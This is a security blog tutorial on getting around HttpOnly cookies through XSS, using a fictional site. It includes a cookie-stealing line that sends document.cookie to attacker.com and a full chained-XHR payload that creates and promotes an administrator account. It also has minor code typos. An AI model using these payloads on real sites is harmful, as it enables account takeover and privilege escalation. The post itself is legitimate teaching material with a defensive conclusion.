Leveraging HttpOnly Cookies via XSS Exploitation with XHR Response Chaining
Introduction
In this blog post we will be discussing basic and practical Cross-Site Scripting (XSS) exploitation as well as discussing ways to leverage XSS despite the presence of the HttpOnly attribute on sensitive cookies.

 

Background
The classic Cross-Site Scripting (XSS) exploit payload uses JavaScript to send the victim’s session cookie to an attack machine. Here is one way of doing that:

 

document.write('<img src=”https://attacker.com/?cookie=' + document.cookie + ‘“ />');
 

However, modern web applications often employ the “HttpOnly” attribute on sensitive cookies, which prevents JavaScript from accessing the cookies. This effectively blocks the classic XSS attack.

 

Example Application
 

Let’s examine the fictional application “foo.com”. Logging into the application looks like the following:

 

[*] Request to login with username and password:

 
```
POST /login HTTP/1.1
Host: foo.com
Content-Type: application/json; charset=utf-8
Content-Length: 37
{"user":"support", "pass":"P@ssw0rd"}
 

[*] Response setting a session cookie with “HttpOnly” set:

 

HTTP/1.1 200 OK
Set-Cookie: session=FFsYXrBxbw-0zlcQKZXLMxdwuDWhl8U0vAY7WrKXZV4K; HttpOnly
Content-Length: 0
 

Even though the session cookie cannot be accessed via JavaScript because the “HttpOnly” flag is set, the cookie is still sent with requests destined for “foo.com”. This means that JavaScript can be used to perform authenticated requests. For example, the following code will make an authenticated GET request to “http://foo.com/” : such as django

 

var req = new XmlHttpRequest();
req.open("GET", “http://foo.com/”, true);
req.withCredentials = true;
req.send(null);
``` 

Using this well-known technique, XSS can be used to exfiltrate the response body of an authenticated request. But, what if we want to perform state-changing actions like adding a new user?

 

Secure web applications will utilize Cross-Site Request Forgery (CSRF) tokens for state-changing requests. An example implementation is for the server to create a strong, random CSRF token that is attached to the user’s session and to a specific request. Before a state-change request is made, the browser requests a CSRF token and uses it as a custom header in the subsequent state-changing request:

 

[*] Request to retrieve CSRF token:

 
GET /csrf HTTP/1.1
Host: foo.com
Cookie: session=FFsYXrBxbw-0zlcQKZXLMxdwuDWhl8U0vAY7WrKXZV4K
 

[*] Response returns CSRF token inside other text:

 

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 85
OK:CSRF:FE0158830904EB86536AC1152B84A0592E239B3698DA4BAD253CEEC1F8273BC7::14433333789
 

Once the CSRF token is retrieved a new user is created like so:

 

[*] Request to create a new user (requires session and CSRF tokens):

 

POST /user HTTP/1.1
Host: foo.com
Cookie: session=FFsYXrBxbw-0zlcQKZXLMxdwuDWhl8U0vAY7WrKXZV4K
X-CSRF: FE0158830904EB86536AC1152B84A0592E239B3698DA4BAD253CEEC1F8273BC7
Content-Type: application/json; charset=utf-8
Content-Length: 43
{"id":"siteadmin", "email":"sa@bar.com"}
 

[*] Response returns the UUID of created user:

 

HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8
Content-Length: 47
{"uuid":"a918ce10-36c0-11e9-b210-d663bd873d93"}
 

To complicate things further, “foo.com” creates all new users with low privileges. But, naturally, we want our new user to be an administrative user. To promote a new user to an administrator, another request must be made that requires the session token, CSRF token, and user UUID:

 

[*] Request to add a user to “admins” role:

 

PUT /user HTTP/1.1
Host: foo.com
Cookie: id=FFsYXrBxbw-0zlcQKZXLMxdwuDWhl8U0vAY7WrKXZV4K
X-CSRF: FE0158830904EB86536AC1152B84A0592E239B3698DA4BAD253CEEC1F8273BC7
Content-Type: application/json; charset=utf-8
Content-Length: 71
{"uuid":"a918ce10-36c0-11e9-b210-d663bd873d93", "role":"admins"}
 

[*] Response indicates user successfully added to “admins” role:

 

HTTP/1.1 200 OK
Content-Length: 0
 

In this situation, using XSS to add an administrative user would require three separate requests, which the last two depending on the output of the request before it.

 

Exploitation
 

Here is annotated JavaScript code that could be used as an XSS payload against “foo.com” to create a new administrative user (assuming the victim session has the proper permissions to do so):

 
```
try {
  var site = "http://foo.com";
  
  // Create an XHR object for each request
  var csrf = new XMLHttpRequest();
  var user = new XMLHttpRequest(); 
  var role = new XMLHttpRequest();
  
  /* Get the CSRF token */
  csrf.open("GET", site + "/csrf", true);  
  csrf.onreadystatechange = function () {
    if (csrf.readyState == 4 && csrf.status == 200) {
      // This branch runs if the response is returned with a 200 status code      
      // Split the response text (remember the CSRF token is included with other text in the response)
      var matches = csrf.responseText.split(":");
      // Now the "matches" array contains the following:
      // ["OK", "CSRF", "FE0158830904EB86536AC1152B84A0592E239B3698DA4BAD253CEEC1F8273BC7", "", "14433333789"]
      
      // The token is at index 2
      csrfToken = matches[2];
      
      /* Use the CSRF token to create a new user */
      user.open("POST", site + "/user", true);
      // Set custom CSRF header and Content-Type
      user.setRequestHeader("X-CSRF", csrfToken);
      user.setRequestHeader("Content-Type", "application/json; charset=utf-8");
      // Send any cookies associated with "foo.com" along with the request
      user.withCredentials = true;
      user.onreadystatechange = function () {
        if (user.readyState == 4 && user.status == 201) {
          // 201 status code
          
          // Extract the UUID from the response
          var uuid = JSON.parse(user.responseText).uuid;
          
          /* Use the UUID to add the new user to the "admins" role */
          role.open("PUT", site + "/user", true);
          role.setRequestHeader("X-CSRF", csrfToken);
          role.setRequestHeader("Content-Type", "application/json; charset=utf-8");
          role.withCredentials = true;
          // Send the role changing request
          role.send("{\"uuid\":\"" + uuid + "\", \"role\":\"admins\"}");
        }
      };
      // Send the user creation request
      user.send("{\"id\":\"attacker\", \"email\":\"attacker@example.com\"}");
    }
  };
  // Send the CSRF retrieval request
  csrf.send(null);
} catch (e) { }
```
                     
Summary
In this blog post, we have shown that simply marking a cookie as “HttpOnly” does not stop an attacker from leveraging that authentication cookie. An attacker can leverage authentication cookies via an XSS attack by simply creating requests in the victim’s browser and sending them to the web application to perform actions as the victim user because the requests will contain the authentication cookie.

Marking authentication cookies as “HttpOnly” is no substitute for good input filtering or using software libraries that handle such security requirements for you.
